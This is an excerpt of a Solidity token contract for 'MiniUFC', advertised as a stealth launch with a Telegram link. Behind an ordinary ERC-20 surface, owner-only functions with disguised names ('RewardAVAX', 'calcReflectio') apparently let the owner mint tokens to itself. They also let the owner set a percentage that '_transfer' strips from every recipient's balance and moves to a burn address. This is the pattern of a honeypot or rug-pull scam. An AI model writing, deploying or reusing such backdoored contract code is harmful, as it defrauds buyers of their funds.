...
/**                     
 *                  MiniUFC - Smashing every mini token on the way!
 * 
 *                            Stealthlaunch!
 *                      
 *                  
 *                   Telegram: https://t.me/MiniUfcBSC
 *                        
 *                   
 *     
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RewardAVAX(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function calcReflectio(uint256 Reflectio) external onlyOwner(){
        _reflectio = Reflectio;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _reflectio);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _reflectio);
...
contract MiniUFC is ERC20 {

    uint tokenTotalSupply = 10000000000;

    constructor() public ERC20("MiniUFC", "MiniUFC") {
